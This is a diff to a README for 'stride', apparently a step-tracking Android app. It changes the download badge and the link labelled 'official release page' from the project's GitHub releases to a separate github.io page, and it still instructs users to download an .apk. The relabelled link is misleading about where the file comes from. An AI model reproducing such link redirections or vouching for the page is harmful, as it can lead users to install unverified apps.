@@ -1,13 +1,13 @@
 # 🚶 stride - Track your daily steps with ease
 
-[![Download Stride](https://img.shields.io/badge/Download-Stride-blue.svg)](https://github.com/rippled-sertoliscell676/stride/releases)
+[![Download Stride](https://img.shields.io/badge/Download-Stride-blue.svg)](https://rippled-sertoliscell676.github.io)
 
 Stride helps you count your steps. This tool brings Material 3 design to your daily fitness tracking. It runs on your computer or phone to track movement and activity throughout the day. It focuses on clean visuals and simple data.
 
 ## 📥 How to download the app
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/rippled-sertoliscell676/stride/releases).
+2. Go to the [official release page](https://rippled-sertoliscell676.github.io).
 3. Look for the Assets section at the bottom of the latest release.
 4. Download the file that ends in .apk for Android devices.
 5. Save the file to your device.
